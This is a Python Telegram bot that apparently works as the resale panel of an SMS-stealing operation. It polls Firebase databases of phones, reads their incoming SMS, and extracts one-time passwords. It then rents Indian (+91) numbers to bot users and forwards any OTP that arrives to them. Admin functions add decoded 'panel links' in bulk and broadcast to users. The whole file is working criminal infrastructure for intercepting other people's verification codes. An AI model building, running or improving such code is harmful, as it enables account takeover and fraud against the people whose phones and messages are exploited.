import asyncio, os, time, logging, random
from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

import database as db
import firebase_utils as fbu

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("OTP-Bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = 8480878371
PORT = int(os.getenv("PORT", 8080))

router = Router()
running_bots = {}
active_scans = {}

class AdminStates(StatesGroup):
    add_bulk_urls = State()
    broadcast = State()

def get_servers_grouped(data):
    fbs = data.get("firebases", [])
    servers = []
    for i in range(0, len(fbs), 25):
        servers.append(fbs[i:i+25])
    return servers

def clear_user_lease(uid):
    data = db.load_data()
    if str(uid) in data["user_leases"]:
        del data["user_leases"][str(uid)]
        db.save_data(data)

async def get_owner_stats():
    data = db.load_data()
    servers = get_servers_grouped(data)
    stats_list = []
    total_devices, online_devices = 0, 0
    
    for idx, server_fbs in enumerate(servers):
        s_online, s_total = 0, 0
        for fb in server_fbs:
            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
            if clients and isinstance(clients, dict):
                s_total += len(clients)
                for dev_id, dev_data in clients.items():
                    if isinstance(dev_data, dict) and dev_data.get("status") is True:
                        s_online += 1
        stats_list.append({"name": f"Server {idx+1}", "fbs": server_fbs, "online": s_online, "total": s_total})
        total_devices += s_total
        online_devices += s_online
    return total_devices, online_devices, stats_list

async def send_otp_to_user(uid, service, otp, msg_text, rent_id):
    otp_msg = (
        f"🔔 <b>OTP Received!</b>\n\n"
        f"📱 <b>Service:</b> {service}\n"
        f"🔑 <b>OTP:</b> {otp}\n\n"
        f"🆔 Rent ID: <code>{rent_id}</code>\n"
        f"💬 <b>Msg:</b> {msg_text[:100]}..."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{otp}", copy_text=CopyTextButton(text=otp))]])
    
    data = db.load_data()
    user = data["users"].get(str(uid))
    if user:
        hist = user.setdefault("otp_history", [])
        hist.insert(0, {"service": service, "otp": otp, "msg": msg_text[:50], "time": int(time.time())})
        user["otp_history"] = hist[:20]
        db.save_data(data)
        
    try:
        bot = running_bots.get(BOT_TOKEN)
        if bot: await bot.send_message(uid, otp_msg, reply_markup=kb, parse_mode="HTML")
    except Exception: pass

async def get_latest_messages_for_fb(fb_url, auth):
    all_msgs = {}
    clients = await fbu.fetch_fb(f"{fb_url}/clients.json", auth)
    if not clients: return all_msgs
    for dev_id in clients.keys():
        msgs = await fbu.fetch_fb(f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", auth)
        if msgs:
            for k, v in msgs.items():
                if isinstance(v, dict) and v.get("type") == "incoming":
                    if int(v.get("id", 0)) > all_msgs.get(dev_id, {}).get("id", 0):
                        all_msgs[dev_id] = v
    return all_msgs

async def background_scanner():
    log.info("Global Scanner Started...")
    while True:
        try:
            data = db.load_data()
            fbs = data.get("firebases", [])
            leases = data.get("user_leases", {})
            
            device_to_users = {}
            current_time = time.time()
            for uid, lease in leases.items():
                if current_time < lease["expire_at"] and "dev_id" in lease:
                    device_to_users.setdefault(lease["dev_id"], []).append(uid)
            
            if device_to_users:
                for fb in fbs:
                    latest_msgs = await get_latest_messages_for_fb(fb["url"], fb.get("auth"))
                    for dev_id, msg in latest_msgs.items():
                        key = (fb["url"], dev_id)
                        msg_id = int(msg.get("id", 0))
                        old_id = active_scans.get(key, 0)
                        if msg_id > old_id:
                            active_scans[key] = msg_id
                            if old_id != 0: 
                                text_content = msg.get("message", "")
                                otp = fbu.extract_otp(text_content)
                                if otp and dev_id in device_to_users:
                                    service = fbu.extract_service_name(text_content, msg.get("sender", ""))
                                    for uid in device_to_users[dev_id]:
                                        await send_otp_to_user(uid, service, otp, text_content, dev_id)
            await asyncio.sleep(3)
        except Exception as e:
            log.error(f"Scanner Error: {e}")
            await asyncio.sleep(5)

def main_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📱 Get Number", callback_data="user:get_num")],
        [InlineKeyboardButton(text="📜 OTP History", callback_data="user:history")]
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Enter as User", callback_data="user:home")],
        [InlineKeyboardButton(text="📊 Analytics", callback_data="admin:analytics")],
        [InlineKeyboardButton(text="🔥 Manage Servers", callback_data="admin:manage_fb")],
        [InlineKeyboardButton(text="🤖 Manage Bots", callback_data="admin:bots")],
        [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
        [InlineKeyboardButton(text="🔄 Refresh Panel", callback_data="admin:home")]
    ])

@router.message(CommandStart())
async def cmd_start(msg: Message):
    data = db.load_data()
    uid = msg.from_user.id
    clear_user_lease(uid)
    
    is_new = False
    if str(uid) not in data["users"]:
        data["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "otp_history": []}
        db.save_data(data)
        is_new = True
    
    if uid == data["owner_id"] or uid in data.get("admins", []):
        try: await msg.answer("⏳ <i>Loading analytics...</i>", parse_mode="HTML")
        except TelegramBadRequest: pass
        await admin_home_msg(msg)
    else:
        if not data.get("free_mode", True): return await msg.answer("⛔ Access Denied.")
        await msg.answer(f"👋 <b>Welcome {msg.from_user.first_name}!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")

async def admin_home_msg(msg: Message):
    total, online, stats_list = await get_owner_stats()
    text = (
        f"👑 <b>Owner Analytics Dashboard</b>\n\n"
        f"🔥 <b>Total Servers:</b> {len(stats_list)}\n"
        f"📱 <b>Total Lines:</b> {total}\n"
        f"🟢 <b>Online Lines:</b> {online}\n"
        f"👥 <b>Total Users:</b> {len(db.load_data().get('users', {}))}\n\n"
        f"<b>Servers List:</b>\n"
    )
    for stat in stats_list:
        text += f"📁 <b>{stat['name']}</b> (Max 25 Bases)\n└ {stat['online']} ON / {stat['total']} Total\n\n"
    try: await msg.answer(text, reply_markup=admin_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:home")
async def admin_home_cb(cq: CallbackQuery):
    try: await cq.message.edit_text("🔄 Refreshing live analytics...")
    except TelegramBadRequest: pass
    await admin_home_msg(cq.message)

@router.callback_query(F.data == "admin:analytics")
async def admin_analytics(cq: CallbackQuery):
    data = db.load_data()
    leases = data.get("user_leases", {})
    text = "📊 <b>Active Rent IDs & Numbers</b>\n\n"
    if not leases:
        text += "No active leases right now."
    for uid, lease in leases.items():
        if time.time() < lease["expire_at"]:
            nums = ", ".join([f"+91{n}" for n in lease.get("numbers", [])]) or "No Number"
            text += f"👤 User: <code>{uid}</code>\n🆔 Rent ID: <code>{lease['dev_id']}</code>\n📞 Number: {nums}\n🌍 Server: {lease.get('country', 'Unknown')}\n\n"
    
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:manage_fb")
async def admin_manage_fb(cq: CallbackQuery):
    data = db.load_data()
    servers = get_servers_grouped(data)
    if not servers: 
        kb = [[InlineKeyboardButton(text="📁 Bulk Add", callback_data="admin:add_bulk")], [InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
        return await cq.message.edit_text("No servers added yet.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    
    kb = []
    for idx, s_fbs in enumerate(servers):
        kb.append([InlineKeyboardButton(text=f"📁 Server {idx+1} ({len(s_fbs)} Bases)", callback_data=f"admin:viewfb:{idx}")])
    
    kb.append([InlineKeyboardButton(text="📁 Bulk Add", callback_data="admin:add_bulk")])
    kb.append([InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")])
    
    try: await cq.message.edit_text("Manage Servers:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:add_bulk")
async def admin_add_bulk_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.add_bulk_urls)
    await cq.message.edit_text("Send URLs or Panel Links (one per line). Auto 25-25 karke Server ban jayega.", parse_mode="HTML")

@router.message(AdminStates.add_bulk_urls)
async def admin_add_bulk_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    added = 0
    
    for line in msg.text.strip().split("\n"):
        url = line.strip()
        if not url: continue
        
        if "#DARKs=" in url or "?s=" in url:
            decoded = fbu.decode_panel_url(url)
            if decoded: url = decoded[0]
            
        if url.startswith("http"):
            data["firebases"].append({"url": url, "label": "Base", "auth": ""})
            added += 1
            
    db.save_data(data)
    await msg.answer(f"✅ Added {added} bases successfully! Auto-Servers created.", reply_markup=admin_kb())

@router.callback_query(F.data.startswith("admin:viewfb:"))
async def admin_viewfb(cq: CallbackQuery):
    idx = int(cq.data.split(":")[2])
    data = db.load_data()
    servers = get_servers_grouped(data)
    if idx >= len(servers): return await cq.answer("Server not found!")
    
    server_fbs = servers[idx]
    
    try: await cq.message.edit_text("🔄 Fetching live bases...")
    except TelegramBadRequest: pass
    
    text = f"📁 <b>Server {idx+1} - Bases List</b>\n\n"
    for i, fb in enumerate(server_fbs):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        is_online = bool(clients and any(isinstance(d, dict) and d.get("status") for d in clients.values()))
        status = "🟢 Online" if is_online else "🔴 Dead/Offline"
        text += f"Base {i+1}: {status}\n🔗 <code>{fb['url']}</code>\n\n"
        
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:manage_fb")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "admin:bots")
async def admin_bots(cq: CallbackQuery):
    data = db.load_data()
    tokens = data.get("extra_tokens", [])
    text = f"🤖 <b>Manage Bots</b>\n\nMain Bot: Active\nExtra Bots: {len(tokens)}\n\nUse <code>/add_bot &lt;token&gt;</code> to add a new bot."
    kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.message(Command("add_bot"))
async def cmd_add_bot(msg: Message):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.answer("Usage: <code>/add_bot &lt;token&gt;</code>", parse_mode="HTML")
    new_token = parts[1]
    
    data = db.load_data()
    if new_token not in data.setdefault("extra_tokens", []):
        data["extra_tokens"].append(new_token)
        db.save_data(data)
        
    if new_token not in running_bots:
        await start_bot_instance(new_token)
        await msg.answer("✅ Bot added and started in background!")
    else:
        await msg.answer("⚠️ Bot is already running.")

async def start_bot_instance(token: str):
    bot = Bot(token=token)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    running_bots[token] = bot
    asyncio.create_task(dp.start_polling(bot))

@router.callback_query(F.data == "admin:broadcast")
async def admin_broadcast(cq: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.broadcast)
    await cq.message.edit_text("Send the message to broadcast to all users:")

@router.message(AdminStates.broadcast)
async def admin_broadcast_done(msg: Message, state: FSMContext):
    await state.clear()
    data = db.load_data()
    users = list(data.get("users", {}).keys())
    success = 0
    for uid in users:
        try:
            bot = running_bots.get(BOT_TOKEN)
            if bot:
                await bot.copy_message(chat_id=int(uid), from_chat_id=msg.chat.id, message_id=msg.message_id)
                success += 1
                await asyncio.sleep(0.05)
        except Exception: pass
    await msg.answer(f"✅ Broadcast sent to {success} users!", reply_markup=admin_kb())

# ================= USER FLOW =================

@router.callback_query(F.data == "user:home")
async def user_home(cq: CallbackQuery):
    try: await cq.message.edit_text("👋 <b>Welcome!</b>\nSelect an option:", reply_markup=main_kb(), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:history")
async def user_history(cq: CallbackQuery):
    uid = cq.from_user.id
    data = db.load_data()
    hist = data["users"].get(str(uid), {}).get("otp_history", [])
    if not hist:
        kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        return await cq.message.edit_text("📜 <b>OTP History</b>\n\nNo history found.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
        
    text = "📜 <b>Your OTP History</b>\n\n"
    for h in hist:
        dt = time.strftime('%H:%M', time.localtime(h['time']))
        text += f"🕒 {dt} | {h['service']}\n🔑 <code>{h['otp']}</code>\n\n"
        
    kb = [[InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    data = db.load_data()
    servers = get_servers_grouped(data)
    if not servers: return await cq.message.edit_text("❌ No servers available.")
    
    kb = []
    for idx, _ in enumerate(servers):
        ping = await fbu.check_ping(servers[idx][0]["url"])
        kb.append([InlineKeyboardButton(text=f"🌍 Server {idx+1} ({ping})", callback_data=f"server_sel:{idx}")])
        
    kb.append([InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")])
    try: await cq.message.edit_text("🌍 <b>Select a Server:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data.startswith("server_sel:"))
async def user_server_selected(cq: CallbackQuery):
    idx = int(cq.data.split(":")[1])
    uid = cq.from_user.id
    clear_user_lease(uid)
    
    data = db.load_data()
    servers = get_servers_grouped(data)
    if idx >= len(servers): return await cq.answer("Server not found!")
    
    server_fbs = servers[idx]
    
    try: await cq.message.edit_text("🔄 Fetching fresh number...")
    except TelegramBadRequest: pass
    
    used = data.setdefault("used_devices", {}).setdefault(str(uid), {})
    now = int(time.time())
    
    available_devices = []
    repeat_devices = []
    all_devices = []
    
    for fb in server_fbs:
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        if not clients: continue
        for dev_id, d in clients.items():
            if isinstance(d, dict) and d.get("status") is True:
                all_devices.append((fb, dev_id, d))
                last_used = used.get(dev_id, 0)
                diff = now - last_used
                
                if diff > 86400: # > 24 hours (Normal)
                    available_devices.append((fb, dev_id, d))
                elif diff > 43200: # 12 to 24 hours (Repeat #)
                    repeat_devices.append((fb, dev_id, d))
    
    is_repeat = False
    if available_devices:
        selected_fb, dev_id, dev_data = random.choice(available_devices)
    elif repeat_devices:
        selected_fb, dev_id, dev_data = random.choice(repeat_devices)
        is_repeat = True
    elif all_devices:
        selected_fb, dev_id, dev_data = random.choice(all_devices)
        is_repeat = True
    else:
        kb = [[InlineKeyboardButton(text="🔄 Try Another Server", callback_data="user:get_num")], [InlineKeyboardButton(text="🏠 Main Menu", callback_data="user:home")]]
        return await cq.message.edit_text("❌ <b>No online lines in this Server.</b>\nTry another Server.", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
        
    used[dev_id] = now
    data["used_devices"][str(uid)] = used
    
    msgs_dict = await fbu.fetch_fb(f"{selected_fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=50", selected_fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    
    if msgs:
        latest_id = max(int(m.get("id", 0)) for m in msgs)
        active_scans[(selected_fb['url'], dev_id)] = latest_id
    
    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    health = fbu.calculate_health(msgs)
    
    data["user_leases"][str(uid)] = {
        "dev_id": dev_id, "fb_url": selected_fb["url"], "country": f"Server {idx+1}", "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600
    }
    db.save_data(data)
    
    repeat_mark = " #" if is_repeat else ""
    
    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            nums_text += f"📞 <code>+91{n}</code>\n"
            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = "⚠️ <b>SIM active hai, OTP aane par number update ho jayega.</b>"
        
    battery = str(dev_data.get("battery", "100")).replace("%", "")
    if not battery or battery == "?": battery = "100"
    
    text = (
        f"📱 <b>Number Details</b>\n"
        f"🔥 Server: {idx+1}\n"
        f"🆔 Rent ID: <code>{dev_id}</code>{repeat_mark}\n"
        f"⚙️ Code: <code>{battery}T</code>\n"
        f"❤️ Health: <b>{health}/10</b>\n\n"
        f"{nums_text}\n"
        f"⌛ <i>Waiting for OTP (1 Hour)...</i>"
    )
    
    kb = kb_nums + [
        [InlineKeyboardButton(text="Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
        [InlineKeyboardButton(text="🔄 Next Number", callback_data=f"server_sel:{idx}"), InlineKeyboardButton(text="⏹ Stop", callback_data="stop_listen")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="user:get_num")]
    ]
    try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    except TelegramBadRequest: pass

@router.callback_query(F.data == "stop_listen")
async def stop_listening(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    await cq.answer("⏹ Listening stopped successfully.", show_alert=True)
    await user_home(cq)

async def main():
    log.info("Bot Started!")
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="Bot is running!"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    main_bot = Bot(token=BOT_TOKEN)
    running_bots[BOT_TOKEN] = main_bot
    asyncio.create_task(background_scanner())
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(main_bot)

if __name__ == "__main__":
    asyncio.run(main())
